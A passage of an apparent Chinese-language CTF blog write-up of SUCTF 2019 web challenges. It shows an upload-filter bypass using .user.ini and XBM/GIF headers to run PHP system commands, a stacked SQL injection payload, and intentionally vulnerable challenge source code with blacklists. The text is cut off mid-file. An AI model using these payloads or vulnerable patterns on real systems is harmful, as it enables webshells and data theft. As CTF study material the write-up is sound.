@@ -1,0 +1,935 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html class="theme-next muse" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png?v=7.1.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.1.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: true,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="SUCTF-2019-Web题目复现">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUCTF-2019-Web-复现">
+<meta property="og:url" content="https://zo1ro.github.io/2019/09/01/suctf-2019/index.html">
+<meta property="og:site_name" content="ZO1RO">
+<meta property="og:description" content="SUCTF-2019-Web题目复现">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://zo1ro.github.io/2019/09/01/suctf-2019/1.png">
+<meta property="og:image" content="https://zo1ro.github.io/2019/09/01/suctf-2019/2.png">
+<meta property="og:image" content="https://zo1ro.github.io/2019/09/01/suctf-2019/3.png">
+<meta property="og:image" content="https://zo1ro.github.io/2019/09/01/suctf-2019/4.png">
+<meta property="og:image" content="https://zo1ro.github.io/2019/09/01/suctf-2019/5.png">
+<meta property="og:image" content="https://zo1ro.github.io/2019/09/01/suctf-2019/6.png">
+<meta property="og:image" content="https://zo1ro.github.io/2019/09/01/suctf-2019/7.png">
+<meta property="og:image" content="https://zo1ro.github.io/2019/09/01/suctf-2019/8.png">
+<meta property="og:image" content="https://zo1ro.github.io/2019/09/01/suctf-2019/9.png">
+<meta property="og:updated_time" content="2019-09-01T09:36:50.145Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SUCTF-2019-Web-复现">
+<meta name="twitter:description" content="SUCTF-2019-Web题目复现">
+<meta name="twitter:image" content="https://zo1ro.github.io/2019/09/01/suctf-2019/1.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="ZO1RO" type="application/atom+xml">
+
+
+
+  
+  
+  <link rel="canonical" href="https://zo1ro.github.io/2019/09/01/suctf-2019/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>SUCTF-2019-Web-复现 | ZO1RO</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZO1RO</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">一个向往acm的ctf_dog</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://zo1ro.github.io/2019/09/01/suctf-2019/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZO1RO">
+      <meta itemprop="description" content="永远做好最坏的打算">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZO1RO">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SUCTF-2019-Web-复现
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-09-01 10:17:12" itemprop="dateCreated datePublished" datetime="2019-09-01T10:17:12+08:00">2019-09-01</time>
+            
+
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>SUCTF-2019-Web题目复现</p>
+<a id="more"></a>
+<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>首页就一个上传框，什么都没有</p>
+<p><img src="1.png" alt="1"></p>
+<p>随意上传文件返回几个不同的报错信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">illegal suffix!</span><br><span class="line"></span><br><span class="line">&amp;lt;? in contents!</span><br><span class="line"></span><br><span class="line">exif_imagetype:not image!</span><br></pre></td></tr></table></figure>
+<p>查找发现类似的题目</p>
+<p><a href="https://thibaudrobin.github.io/articles/bypass-filter-upload/" target="_blank" rel="noopener">Insomnihack 2019—–l33t-hoster</a></p>
+<p>在那题发现有很多相似点，出现以下情况将报错</p>
+<ul>
+<li>&lt;?包含在文件内容中</li>
+<li>如果文件只有扩展名(像 .htaccess, .txt)</li>
+<li>文件不允许的扩展名</li>
+<li>无法经过exif_imagetype的检验</li>
+<li>getimagesize不返回1337 * 1337</li>
+</ul>
+<p>原题通过上传一个<code>.htaccess</code>，然后<code>IMAGETYPE_XBM</code>绕过<code>exif_imagetype</code>，从而绕过后缀解析进行<code>getshell</code>，但原题是<code>apache</code>环境，本题为<code>nginx</code>环境。</p>
+<p>参考链接</p>
+<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">user.ini文件构成的PHP后门</a></p>
+<p>原理就是在<code>nginx</code>服务器上传一个<code>.user.ini</code>（这里作用相当于<code>apache</code>的<code>.htaccess</code>，但其实更像<code>php.ini</code>，只要是以<code>fastcgi</code>运行的php都可以用这个方法)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=01.gif</span><br><span class="line">//通过预加载01.gif的内容到当前所有php文件，类似于在文件前调用require函数，而auto_append_file是在文件后调用require函数</span><br></pre></td></tr></table></figure>
+<p>那么我们通过这种方法，结合前面的<code>IMAGETYPE_XBM</code>上传一个<code>.user.ini</code></p>
+<p><img src="2.png" alt="2"></p>
+<p>上传成功，接着继续上传<code>01.gif</code>包含到<code>index.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;system(&quot;cat%20%2fflag&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="3.png" alt="3"></p>
+<p><img src="4.png" alt="4"></p>
+<p>还是比较有意思的一题，关键点在于<code>IMAGETYPE_XBM</code>和<code>.user.ini</code>的绕过。</p>
+<p>贴上题目源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// error_reporting(0);</span><br><span class="line">$userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">if (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, 0777, true);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;);</span><br><span class="line">if (isset($_POST[&quot;upload&quot;])) &#123;</span><br><span class="line">    $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];</span><br><span class="line">    if (!$tmp_name) &#123;</span><br><span class="line">        die(&quot;filesize too big!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!$name) &#123;</span><br><span class="line">        die(&quot;filename cannot be empty!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension = substr($name, strrpos($name, &quot;.&quot;) + 1);</span><br><span class="line">    if (preg_match(&quot;/ph|htacess/i&quot;, $extension)) &#123;</span><br><span class="line">        die(&quot;illegal suffix!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) &#123;</span><br><span class="line">        die(&quot;&amp;lt;? in contents!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type = exif_imagetype($tmp_name);</span><br><span class="line">    if (!$image_type) &#123;</span><br><span class="line">        die(&quot;exif_imagetype:not image!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path = $userdir . &quot;/&quot; . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    echo &quot;Your dir &quot; . $userdir. &apos; &lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;Your files : &lt;br&gt;&apos;;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看 <a href="https://xz.aliyun.com/t/6042#toc-25" target="_blank" rel="noopener">CheckIn-WP</a> 发现加个图片文件头也可以绕过 <code>exif_image</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;system(&quot;cat /flag&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>摆出一个注入框，提交正确信息会返回一些数据，错误信息不返回数据</p>
+<p><img src="5.png" alt="5"></p>
+<p><img src="6.png" alt="5"></p>
+<p>先<code>fuzz</code>一下，发现可以通过<code>;</code>划分<code>sql</code>语句进行执行，</p>
+<p><img src="7.png" alt="5"></p>
+<p>有点类似之前的堆叠注入： <a href="https://blog.csdn.net/m0_38100569/article/details/99617762" target="_blank" rel="noopener">BUUCTF_Web_随便注</a>，但是预加载被黑名单</p>
+<p><img src="8.png" alt="8"></p>
+<p>看一下源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line">    if(isset($post[&apos;query&apos;]))&#123;</span><br><span class="line">        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;</span><br><span class="line">        //var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]));</span><br><span class="line">        if(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]))&#123;</span><br><span class="line">            //echo $post[&apos;query&apos;];</span><br><span class="line">            die(&quot;Nonono.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(strlen($post[&apos;query&apos;])&gt;40)&#123;</span><br><span class="line">            die(&quot;Too long.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        do&#123;</span><br><span class="line">            if($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                while($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;while(@mysqli_next_result($MysqlLink));</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+<p>发现拼接方式是 <code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code></p>
+<p>那么就可以通过<code>select *,1||flag from Flag</code>进行查询。</p>
+<p><img src="9.png" alt="8"></p>
+<p>也可以通过设置<code>sql_mode</code>改变<code>||</code>为拼接字符串，参考链接</p>
+<p><a href="https://blog.csdn.net/lixora/article/details/60572357" target="_blank" rel="noopener">mysql 修改sql_mode 实现字符串管道‘||’连接</a></p>
+<p>构成<code>payload</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode=pipes_as_concat;select 1</span><br><span class="line"></span><br><span class="line">返回</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1SUCTF&#123;SUCTF_baby_sql_chall_120993n810h3&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p><code>index.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function get_the_flag()&#123;</span><br><span class="line">    // webadmin will remove your upload file every 20 min!!!! </span><br><span class="line">    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    if(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!empty($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line">    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); </span><br><span class="line">        if(mb_strpos(file_get_contents($tmp_name), &apos;&lt;?&apos;)!==False) die(&quot;^_^&quot;);</span><br><span class="line">    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); </span><br><span class="line">        $path= $userdir.&quot;/&quot;.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[&apos;_&apos;];</span><br><span class="line"></span><br><span class="line">if (!$hhh)&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strlen($hhh)&gt;18)&#123;</span><br><span class="line">    die(&apos;One inch long, one inch strong!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( preg_match(&apos;/[\x00- 0-9A-Za-z\&apos;&quot;\`~_&amp;.,|=[\x7F]+/i&apos;, $hhh) )</span><br><span class="line">    die(&apos;Try something else!&apos;);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, 3);</span><br><span class="line">if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);</span><br><span class="line"></span><br><span class="line">eval($hhh);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="upload-lab2"><a href="#upload-lab2" class="headerlink" title="upload-lab2"></a>upload-lab2</h2><p><code>index.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$userdir = &quot;upload/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">if (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, 0777, true);</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_POST[&quot;upload&quot;])) &#123;</span><br><span class="line">    // 允许上传的图片后缀</span><br><span class="line">    $allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);</span><br><span class="line">    $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $file_name = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    $temp = explode(&quot;.&quot;, $file_name);</span><br><span class="line">    $extension = end($temp);</span><br><span class="line">    if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)</span><br><span class="line">            || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)</span><br><span class="line">            || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;))</span><br><span class="line">        &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 204800)   // 小于 200 kb</span><br><span class="line">        &amp;&amp; in_array($extension, $allowedExts)</span><br><span class="line">    ) &#123;</span><br><span class="line">        $c = new Check($tmp_name);</span><br><span class="line">        $c-&gt;check();</span><br><span class="line">        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) &#123;</span><br><span class="line">            echo &quot;错误：: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            move_uploaded_file($tmp_name, $userdir . &quot;/&quot; . md5($file_name) . &quot;.&quot; . $extension);</span><br><span class="line">            echo &quot;文件存储在: &quot; . $userdir . &quot;/&quot; . md5($file_name) . &quot;.&quot; . $extension;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;非法的文件格式&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>func.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;class.php&apos;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;submit&quot;]) &amp;&amp; isset($_POST[&quot;url&quot;])) &#123;</span><br><span class="line">    if(preg_match(&apos;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&apos;,$_POST[&apos;url&apos;]))&#123;</span><br><span class="line">        die(&quot;Go away!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $file_path = $_POST[&apos;url&apos;];</span><br><span class="line">        $file = new File($file_path);</span><br><span class="line">        $file-&gt;getMIME();</span><br><span class="line">        echo &quot;&lt;p&gt;Your file type is &apos;$file&apos; &lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>class.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;config.php&apos;;</span><br><span class="line"></span><br><span class="line">class File&#123;</span><br><span class="line"></span><br><span class="line">    public $file_name;</span><br><span class="line">    public $type;</span><br><span class="line">    public $func = &quot;Check&quot;;</span><br><span class="line"></span><br><span class="line">    function __construct($file_name)&#123;</span><br><span class="line">        $this-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $class = new ReflectionClass($this-&gt;func);</span><br><span class="line">        $a = $class-&gt;newInstanceArgs($this-&gt;file_name);</span><br><span class="line">        $a-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getMIME()&#123;</span><br><span class="line">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        $this-&gt;type = finfo_file($finfo, $this-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        return $this-&gt;type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Check&#123;</span><br><span class="line"></span><br><span class="line">    public $file_name;</span><br><span class="line"></span><br><span class="line">    function __construct($file_name)&#123;</span><br><span class="line">        $this-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check()&#123;</span><br><span class="line">        $data = file_get_contents($this-&gt;file_name);</span><br><span class="line">        if (mb_strpos($data, &quot;&lt;?&quot;) !== FALSE) &#123;</span><br><span class="line">            die(&quot;&amp;lt;? in contents!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>admin.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 